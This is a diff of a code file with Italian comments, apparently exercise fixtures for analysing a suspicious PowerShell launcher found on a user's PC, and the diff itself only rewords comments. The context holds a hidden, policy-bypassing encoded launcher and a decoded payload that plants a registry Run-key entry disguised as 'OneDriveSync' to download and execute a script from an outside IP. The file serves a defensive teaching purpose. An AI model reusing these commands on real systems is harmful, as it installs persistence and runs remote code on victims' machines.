@@ -7,7 +7,7 @@ Write-Host "Ciao $nome, oggi è $(Get-Date -Format 'dd/MM/yyyy')"
 `;
 
 // Script "trovato" sul PC di un utente. In alto un launcher innocuo,
-// dentro un blob Base64 che è la vera parte cattiva.
+// dentro un blocco Base64 che è la vera parte cattiva.
 export const SUSPICIOUS_LAUNCHER = `# update.ps1 — trovato in C:\\Users\\marco\\Downloads
 # Eseguito automaticamente dallo Scheduler "WindowsUpdateHelper"
 powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand \\
@@ -22,7 +22,7 @@ powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCo
 `;
 
 // La stringa Base64 decodificata (UTF-16 LE): il vero payload.
-// Nota: la mostriamo come stringa già decodificata; nel task 3 la deriviamo dal blob.
+// Nota: la mostriamo come stringa già decodificata; nel task 3 la deriviamo dal blocco.
 export const DECODED_PAYLOAD = `$p='HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';Set-ItemProperty -Path $p -Name 'OneDriveSync' -Value 'powershell -NoP -W H -E bypass -c "iwr http://185.77.224.12/a.ps1 -OutFile $env:TEMP\\a.ps1; . $env:TEMP\\a.ps1"'`;
 
 // Base64 “grezzo” senza a-capo, esattamente ciò che l'utente deve incollare.
